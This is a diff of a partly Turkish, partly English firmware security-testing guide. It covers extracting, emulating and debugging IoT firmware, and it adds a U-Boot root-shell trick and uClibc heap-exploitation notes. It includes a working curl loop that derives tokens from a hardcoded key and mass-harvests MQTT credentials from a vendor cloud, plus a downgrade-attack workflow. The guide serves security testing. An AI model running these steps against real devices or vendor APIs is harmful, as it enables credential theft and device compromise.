@@ -23,42 +23,55 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 mediatek-xflash-carbonara-da2-hash-bypass.md
 {{#endref}}
 
-Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte depolanır; bu sayede cihaz güç verildiğinde hayati talimatlara erişir ve işletim sisteminin başlatılmasını sağlar. Firmware'i incelemek ve potansiyel olarak değiştirmek, güvenlik açıklarını belirlemede kritik bir adımdır.
+Firmware, cihazların donanım bileşenleri ile kullanıcıların etkileştiği yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel bir yazılımdır. Kalıcı bellekte depolanır, böylece cihaz güç açıldığında hayati talimatlara erişebilir ve işletim sisteminin başlatılmasını sağlar. Firmware'in incelenmesi ve potansiyel olarak değiştirilmesi, güvenlik açıklarını belirlemede kritik bir adımdır.
 
 ## **Bilgi Toplama**
 
-**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç şunların toplanmasını içerir:
+**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamadaki kritik ilk adımdır. Bu süreç şu verilerin toplanmasını içerir:
 
-- CPU mimarisi ve üzerinde çalışan işletim sistemi
-- Bootloader detayları
-- Donanım yerleşimi ve teknik veri sayfaları
+- CPU mimarisi ve çalıştırdığı işletim sistemi
+- Bootloader spesifikasyonları
+- Donanım düzeni ve datasheet'ler
 - Kod tabanı metrikleri ve kaynak konumları
-- Harici kütüphaneler ve lisans tipleri
-- Güncelleme geçmişleri ve düzenleyici sertifikasyonlar
+- Harici kütüphaneler ve lisans türleri
+- Güncelleme geçmişleri ve düzenleyici sertifikalar
 - Mimari ve akış diyagramları
-- Güvenlik değerlendirmeleri ve tespit edilen açıklar
+- Güvenlik değerlendirmeleri ve tespit edilen zafiyetler
 
-Bu amaçla, **open-source intelligence (OSINT)** araçları paha biçilmezdir; ayrıca mevcut açık kaynak yazılım bileşenlerinin elle ve otomatik inceleme süreçleriyle analizi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları tespit etmek için kullanılabilecek ücretsiz statik analiz sunar.
+Bu amaç için, açık kaynak istihbaratı (OSINT) araçları çok değerlidir; ayrıca mevcut açık kaynak yazılım bileşenlerinin manuel ve otomatik incelemelerle analiz edilmesi önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.
 
-## **Firmware Edinme**
+## **Firmware'i Elde Etme**
 
-Firmware elde etmek farklı yollarla gerçekleştirilebilir; her birinin kendine özgü zorluk seviyesi vardır:
+Firmware elde etme çeşitli yollarla yaklaşılabilir; her birinin farklı zorluk seviyeleri vardır:
 
-- **Doğrudan** kaynaktan (geliştiriciler, üreticiler)
-- Sağlanan talimatlardan **derleyerek**
-- Resmi destek sitelerinden **indirerek**
-- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularını kullanarak
-- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişim
-- Man-in-the-middle teknikleriyle güncellemeleri yakalayarak
-- Cihazdan **UART**, **JTAG** veya **PICit** gibi bağlantılar aracılığıyla çıkararak
-- Cihaz iletişimi içinde güncelleme isteklerini **Sniffing** ile yakalayarak
-- **Hardcoded update endpoints**'leri tespit edip kullanarak
-- Bootloader'dan veya ağdan **dumping** yaparak
-- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçları kullanarak depolama yongasını söküp okuyarak
+- Kaynaktan doğrudan (geliştiriciler, üreticiler)
+- Sağlanan talimatlardan derleyerek oluşturma
+- Resmi destek sitelerinden indirme
+- Barındırılan firmware dosyalarını bulmak için Google dork sorguları kullanma
+- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla cloud storage'a doğrudan erişim
+- Man-in-the-middle teknikleriyle güncellemeleri yakalama
+- UART, JTAG veya PICit gibi bağlantılar aracılığıyla cihazdan çıkarma
+- Cihaz iletişiminde update isteklerini sniffing ile yakalama
+- Hardcoded update endpoints belirleme ve kullanma
+- Bootloader veya ağ üzerinden dumping
+- Diğer tüm yöntemler başarısız olduğunda uygun donanım araçları kullanarak depolama çipini sökme ve okuma
+
+### UART-only logs: force a root shell via U-Boot env in flash
+
+If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:
+
+1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
+```bash
+flashrom -p ch341a_spi -r flash.bin
+```
+2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
+3. Reflash only the env partition and reboot; a shell should appear on UART.
+
+This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.
 
 ## Firmware'i Analiz Etme
 
-Artık firmware'e sahip olduğunuza göre, nasıl işlem yapacağınızı bilmek için ondan bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:
+Artık firmware'e sahip olduğunuz için, nasıl ele alacağınızı bilmek amacıyla ondan bilgi çıkartmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -67,9 +80,9 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Eğer bu araçlarla çok şey bulamıyorsanız görüntünün **entropy**'sini `binwalk -E <bin>` ile kontrol edin; entropy düşükse muhtemelen şifrelenmemiştir. Entropy yüksekse, muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).
+Eğer bu araçlarla çok bir şey bulamazsanız, görüntünün **entropi**'sini `binwalk -E <bin>` ile kontrol edin; düşük entropi ise büyük olasılıkla şifrelenmemiştir. Yüksek entropi ise muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).
 
-Ayrıca, bu araçları kullanarak **firmware içinde gömülü dosyaları** çıkarabilirsiniz:
+Ayrıca, bu araçları firmware içine gömülü **dosyaları çıkarmak** için kullanabilirsiniz:
 
 
 {{#ref}}
@@ -78,14 +91,14 @@ Ayrıca, bu araçları kullanarak **firmware içinde gömülü dosyaları** çı
 
 Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.
 
-### Filesystem'i Elde Etme
+### Dosya Sistemini Elde Etme
 
-Önceki bahsedilen araçlarla, ör. `binwalk -ev <bin>` kullanarak **filesystem'i çıkarabilmiş** olmalısınız.\
-Binwalk genellikle bunu **filesystem türü adını taşıyan bir klasörün içinde** çıkarır; bu genellikle aşağıdakilerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
+Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Manuel Filesystem Çıkarma
+#### Manuel Dosya Sistemi Çıkarma
 
-Bazen binwalk'ın imzalarında **filesystem'in magic byte'ı olmayabilir**. Bu durumlarda, binwalk'ı kullanarak **filesystem'in offset'ini bulun ve ikili dosyadan sıkıştırılmış filesystem'i carve edin** ve aşağıdaki adımları kullanarak filesystem'i türüne göre **elle çıkarın**.
+Bazen binwalk, **dosya sisteminin magic byte'ını imzalarında bulamayabilir**. Bu durumlarda, binwalk'ı kullanarak **dosya sisteminin offset'ini bulun ve sıkıştırılmış dosya sistemini** binary'den carve edin ve aşağıdaki adımları kullanarak dosya sistemini türüne göre **manuel olarak çıkarın**.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -97,7 +110,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-Squashfs filesystem'ini carve etmek için aşağıdaki **dd command**'i çalıştırın.
+Squashfs filesystem'ini carving yapan aşağıdaki **dd command**'ı çalıştırın.
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -107,37 +120,37 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
-Alternatively, the following command could also be run.
+Alternatif olarak, aşağıdaki komut da çalıştırılabilir.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- For squashfs (used in the example above)
+- squashfs için (yukarıdaki örnekte kullanıldı)
 
 `$ unsquashfs dir.squashfs`
 
-Files will be in "`squashfs-root`" directory afterwards.
+Dosyalar daha sonra `squashfs-root` dizininde olacaktır.
 
-- CPIO archive files
+- CPIO arşiv dosyaları
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- For jffs2 filesystems
+- jffs2 dosya sistemleri için
 
 `$ jefferson rootfsfile.jffs2`
 
-- For ubifs filesystems with NAND flash
+- NAND flash içeren ubifs dosya sistemleri için
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
-## Analyzing Firmware
+## Firmware Analizi
 
-Once the firmware is obtained, it's essential to dissect it for understanding its structure and potential vulnerabilities. This process involves utilizing various tools to analyze and extract valuable data from the firmware image.
+Firmware elde edildikten sonra, yapısını ve potansiyel güvenlik açıklarını anlamak için onu detaylı şekilde incelemek önemlidir. Bu süreç, firmware imajından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.
 
-### Initial Analysis Tools
+### İlk Analiz Araçları
 
-A set of commands is provided for initial inspection of the binary file (referred to as `<bin>`). These commands help in identifying file types, extracting strings, analyzing binary data, and understanding the partition and filesystem details:
+İkili dosyanın (`<bin>` olarak anılacak) ilk incelemesi için bir dizi komut verilmiştir. Bu komutlar dosya türlerini belirlemeye, stringleri çıkarmaya, ikili veriyi analiz etmeye ve bölüm ile dosya sistemi detaylarını anlamaya yardımcı olur:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -146,70 +159,70 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-İmajın şifreleme durumunu değerlendirmek için, **entropi** `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifreleme eksikliğine işaret ederken, yüksek entropi olası şifreleme veya sıkıştırmayı gösterir.
+Görüntünün şifreleme durumunu değerlendirmek için **entropi** `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifrelemenin olmadığını, yüksek entropi ise muhtemel şifreleme veya sıkıştırmayı gösterir.
 
-Gömülü dosyaları çıkarmak için, dosya inceleme amacıyla **file-data-carving-recovery-tools** dokümantasyonu ve **binvis.io** gibi araçlar ve kaynaklar önerilir.
+Gömülü dosyaları çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** gibi araçlar ve kaynaklar önerilir.
 
 ### Dosya Sistemini Çıkarma
 
-`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; genellikle dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk** magic baytlarının eksikliği nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından dosya sistemini carve etmek için `dd` komutunu çalıştırmayı içerir:
+`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; çoğunlukla dosya sistemi türünün adına göre isimlendirilmiş bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak, **binwalk** eksik magic baytları nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından `dd` komutuyla dosya sistemini ayıklamayı içerir:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği elle çıkarmak için farklı komutlar kullanılır.
+Ardından, dosya sistemi türüne bağlı olarak (ör. squashfs, cpio, jffs2, ubifs), içeriği elle çıkarmak için farklı komutlar kullanılır.
 
 ### Dosya Sistemi Analizi
 
-Dosya sistemi çıkarıldıktan sonra güvenlik açıklarının araştırılması başlar. Özellikle insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts ve çevrimdışı analiz için compiled binaries'e dikkat edilir.
+Dosya sistemi çıkarıldıktan sonra, güvenlik açıkları aranmaya başlanır. Güvensiz ağ daemon'ları, gömülü (hardcoded) kimlik bilgileri, API uç noktaları, update server işlevleri, derlenmemiş kod, startup script'leri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.
 
-**Anahtar konumlar** ve **incelenecek öğeler** şunlardır:
+**İncelenecek önemli konumlar** ve **öğeler** şunlardır:
 
-- **etc/shadow** ve **etc/passwd** (kullanıcı kimlik bilgileri için)
-- SSL sertifikaları ve anahtarları **etc/ssl** içinde
+- **etc/shadow** ve **etc/passwd** — kullanıcı kimlik bilgileri için
+- **etc/ssl** içindeki SSL sertifikaları ve anahtarlar
 - Potansiyel zafiyetler için yapılandırma ve script dosyaları
-- Daha ileri analiz için gömülü ikili dosyalar
+- İleri analiz için gömülü ikili dosyalar
 - Yaygın IoT cihaz web sunucuları ve ikili dosyalar
 
-Dosya sistemi içindeki hassas bilgi ve zafiyetleri ortaya çıkarmada yardımcı birkaç araç:
+Dosya sistemi içindeki hassas bilgileri ve zayıflıkları ortaya çıkarmada birkaç araç yardımcı olur:
 
-- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
-- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
-- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis
+- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker) hassas bilgi aramaları için
+- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kapsamlı firmware analizi için
+- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba) statik ve dinamik analiz için
 
-### Derlenmiş İkili Dosyalar Üzerinde Güvenlik Kontrolleri
+### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri
 
-Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar zafiyetler için dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, istismar edilebilecek korunmasız ikili dosyaları tespit etmeye yardımcı olur.
+Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar zafiyetler açısından dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, sömürülebilecek korumasız ikili dosyaları tespit etmeye yardımcı olur.
 
-## Türetilmiş URL token'ları ile bulut konfigürasyonu ve MQTT kimlik bilgilerinin toplanması
+## Türetilmiş URL token'ları yoluyla cloud config ve MQTT kimlik bilgilerinin toplanması
 
-Birçok IoT hub'ı, cihaz başına konfigürasyonunu şu görünüme sahip bir bulut endpoint'inden çeker:
+Birçok IoT hub'ı cihaz başına yapılandırmayı aşağıdaki gibi görünen bir cloud endpoint'inden alır:
 
 - `https://<api-host>/pf/<deviceId>/<token>`
 
-Firmware analizinde `<token>`'ın cihaz ID'si ve hardcoded bir secret kullanılarak yerel olarak türetildiğini görebilirsiniz, örneğin:
+Firmware analizinde, `<token>`'ın device ID'den yerel olarak, gömülü bir secret kullanılarak türetildiğini bulabilirsiniz. Örneğin:
 
 - token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
 
-Bu tasarım, deviceId ve STATIC_KEY'i bilen herhangi birinin URL'i yeniden oluşturup bulut konfigürasyonunu çekmesine izin verir; bu genellikle düz metin MQTT kimlik bilgilerini ve konu öneklerini ortaya çıkarır.
+Bu tasarım, deviceId ve STATIC_KEY öğrenen herhangi bir kişinin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak sağlar; bu genellikle düz metin MQTT kimlik bilgilerini ve konu ön eklerini açığa çıkarır.
 
 Pratik iş akışı:
 
-1) UART boot loglarından deviceId'i çıkarın
+1) UART boot loglarından deviceId'yi çıkarın
 
-- 3.3V UART adaptörü (TX/RX/GND) bağlayın ve logları yakalayın:
+- 3.3V bir UART adaptörünü (TX/RX/GND) bağlayın ve logları kaydedin:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- cloud config URL pattern ve broker address'i yazdıran satırları arayın, örneğin:
+- Bulut yapılandırma URL deseni ve broker adresini yazdıran satırları arayın, örneğin:
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
 2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın
 
-- İkili dosyaları Ghidra/radare2'ye yükleyin ve config yolunu ("/pf/") veya MD5 kullanımını arayın.
+- İkili dosyaları Ghidra/radare2'ye yükleyin ve konfigürasyon yolu ("/pf/") veya MD5 kullanımını arayın.
 - Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
 - Token'ı Bash'te türetin ve digest'i büyük harfe çevirin:
 ```bash
@@ -217,27 +230,27 @@ DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
 printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
-3) Harvest cloud config and MQTT credentials
+3) Cloud config ve MQTT credentials toplayın
 
-- URL'i oluşturun ve curl ile JSON'u çekin; jq ile ayrıştırıp secrets'i çıkarın:
+- URL'i oluşturun ve curl ile JSON çekin; jq ile parse ederek secrets'leri çıkarın:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Düz metin MQTT ve zayıf topic ACL'lerini (varsa) kötüye kullanın
+4) Plaintext MQTT ve zayıf topic ACLs'lerini kötüye kullanma (varsa)
 
-- Kurtarılan kimlik bilgilerini kullanarak bakım konularına abone olun ve hassas olayları arayın:
+- Recovered credentials kullanarak maintenance topic'larına subscribe olun ve hassas olayları arayın:
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
 -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) Öngörülebilir cihaz kimliklerini listeleme (ölçekli, yetkilendirme ile)
+5) Tahmin edilebilir cihaz ID'lerini sıralayın (ölçekli, yetkilendirmeyle)
 
-- Birçok ekosistem satıcı OUI/product/type baytlarını ardışık bir son ekle birlikte gömer.
-- Aday ID'leri yineleyebilir, tokenler türetebilir ve konfigürasyonları programlı olarak çekebilirsiniz:
+- Birçok ekosistem vendor OUI/product/type bytes'larını ardına gelen sıralı bir sonek ile gömüyor.
+- Aday ID'leri yineleyebilir, tokens türetebilir ve configs'i programlı olarak çekebilirsiniz:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -247,19 +260,19 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Notlar
-- mass enumeration denemeden önce her zaman açık yetki alın.
-- Mümkünse hedef donanımı değiştirmeden secrets'i kurtarmak için emulation veya static analysis'i tercih edin.
+- mass enumeration denemeden önce her zaman açık yetki (explicit authorization) alın.
+- Mümkünse hedef donanımı değiştirmeden gizli bilgileri geri kazanmak için emulation veya static analysis'i tercih edin.
 
 
-Firmware emülasyonu süreci, bir cihazın işletimi veya tek bir programın **dynamic analysis**'ine olanak tanır. Bu yaklaşım donanım veya mimari bağımlılıklarla karşılaşabilir, ancak root filesystem'i veya belirli binaries'leri aynı architecture ve endianness'e sahip bir cihaza, örneğin Raspberry Pi'ye, veya önceden hazırlanmış bir virtual machine'e aktararak daha fazla test yapılmasını kolaylaştırabilirsiniz.
+Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis**'ine olanak tanır. Bu yaklaşım donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir, ancak root filesystem'i veya belirli binaries'i, eşleşen architecture ve endianness'e sahip bir cihaza, örneğin Raspberry Pi'ye, veya önceden hazırlanmış bir virtual machine'e aktarmak, daha ileri testleri kolaylaştırabilir.
 
-### Bireysel binaries'lerin Emülasyonu
+### Bireysel binaries'i emüle etme
 
-Tek programları incelerken, programın endianness'inin ve CPU architecture'ının belirlenmesi kritiktir.
+Tek bir programı incelemek için programın endianness'ini ve CPU architecture'ını belirlemek çok önemlidir.
 
-#### MIPS Architecture Örneği
+#### MIPS Architecture ile Örnek
 
-MIPS architecture binary'yi emüle etmek için şu komut kullanılabilir:
+MIPS Architecture binary'sini emüle etmek için şu komut kullanılabilir:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
@@ -269,50 +282,68 @@ sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system
 ```
 For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.
 
-#### ARM Architecture Emulation
+#### ARM Mimari Emülasyonu
 
 For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.
 
-### Full System Emulation
+### Tam Sistem Emülasyonu
 
 Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.
 
-## Dynamic Analysis in Practice
+## Dinamik Analiz Uygulamada
 
-At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.
+Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve filesystem'e shell erişimini korumak esastır. Emülasyon donanım etkileşimlerini mükemmel şekilde taklit etmeyebilir; bu yüzden zaman zaman emülasyonun yeniden başlatılması gerekebilir. Analiz filesystem'e yeniden bakmalı, açığa çıkan webpages ve network servislerini exploit etmeli ve bootloader zafiyetlerini araştırmalıdır. Firmware bütünlüğü testleri potansiyel backdoor zafiyetlerini tespit etmek için kritiktir.
 
-## Runtime Analysis Techniques
+## Çalışma Zamanı Analiz Teknikleri
 
-Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.
+Çalışma zamanı analizi, bir süreç veya binary ile onun çalıştığı ortamda etkileşime girmeyi içerir; breakpoint koymak ve fuzzing gibi tekniklerle zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.
 
+For embedded targets without a full debugger, **cihaza statik bağlı bir `gdbserver` kopyalayın** ve uzaktan bağlayın:
+```bash
+# On device
+gdbserver :1234 /usr/bin/targetd
+```
+
+```bash
+# On host
+gdb-multiarch /path/to/targetd
+target remote <device-ip>:1234
+```
 ## Binary Exploitation and Proof-of-Concept
 
-Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.
+Belirlenen zaafiyetler için bir PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlamayı gerektirir. Gömülü sistemlerde binary çalışma zamanı korumaları nadirdir; ancak mevcutsa Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.
+
+### uClibc fastbin exploitation notes (embedded Linux)
+
+- **Fastbins + consolidation:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir tahsis `__malloc_consolidate()`'u tetikleyebilir; bu yüzden herhangi bir sahte chunk kontrollerden geçmelidir (mantıklı boyut, `fd = 0` ve çevresindeki chunk'ların "in use" olarak görünmesi).
+- **Non-PIE binaries under ASLR:** ASLR etkin olsa bile ana binary **non-PIE** ise, ikili içindeki `.data/.bss` adresleri stabildir. Geçerli bir heap chunk header'ına zaten benzeyen bir bölgeyi hedefleyerek fastbin tahsisinin bir **function pointer table** üzerine düşmesini sağlayabilirsiniz.
+- **Parser-stopping NUL:** JSON parse edilirken, payload içindeki bir `\x00` parsing'i durdurabilir ve takip eden saldırgan kontrollü baytları stack pivot/ROP zinciri için saklamaya devam edebilir.
+- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP zinciri, bilinen bir mapping içine executable shellcode yerleştirip oraya atlayabilir.
 
 ## Prepared Operating Systems for Firmware Analysis
 
-Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.
+[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, gerekli araçlarla ön-yapılandırılmış firmware güvenlik testi ortamları sağlar.
 
 ## Prepared OSs to analyze Firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının güvenlik değerlendirmesi ve penetration testing yapmanıza yardımcı olmak için tasarlanmış bir distro. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware security testing araçlarıyla önceden yüklenmiş gömülü güvenlik test işletim sistemidir.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing'ini yapmanıza yardımcı olmak için tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu ön-yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware security testing araçlarıyla önceden yüklenmiş bir embedded security testing işletim sistemidir.
 
 ## Firmware Downgrade Attacks & Insecure Update Mechanisms
 
-Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.
+Bir satıcı firmware image'ları için kriptografik imza kontrolleri uygulasın, **version rollback (downgrade) koruması sıklıkla ihmal edilir**. Eğer boot- veya recovery-loader yalnızca gömülü bir public key ile imzayı doğruluyor ama flaşlanan imajın *version*'ını (veya monotonik bir sayacı) kıyaslamıyorsa, bir saldırgan meşru yollarla **hala geçerli imzaya sahip daha eski, zafiyetli bir firmware** yükleyebilir ve böylece yamalanmış zaafiyetleri tekrar sisteme sokabilir.
 
-Typical attack workflow:
+Tipik saldırı iş akışı:
 
-1. **Obtain an older signed image**
-* Grab it from the vendor’s public download portal, CDN or support site.
-* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
-* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
-2. **Upload or serve the image to the device** via any exposed update channel:
-* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
-* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
-3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
-4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.
+1. **Eski imzalı bir image edinme**
+   * Satıcının kamuya açık indirme portalından, CDN'den veya destek sitesinden alın.
+   * Eşlik eden mobil/masaüstü uygulamalarından çıkarın (ör. bir Android APK içinde `assets/firmware/` altında).
+   * VirusTotal, internet arşivleri, forumlar gibi üçüncü taraf depolarından alın.
+2. **İmajı cihaza yükleyin veya servis edin** herhangi bir açık güncelleme kanalı üzerinden:
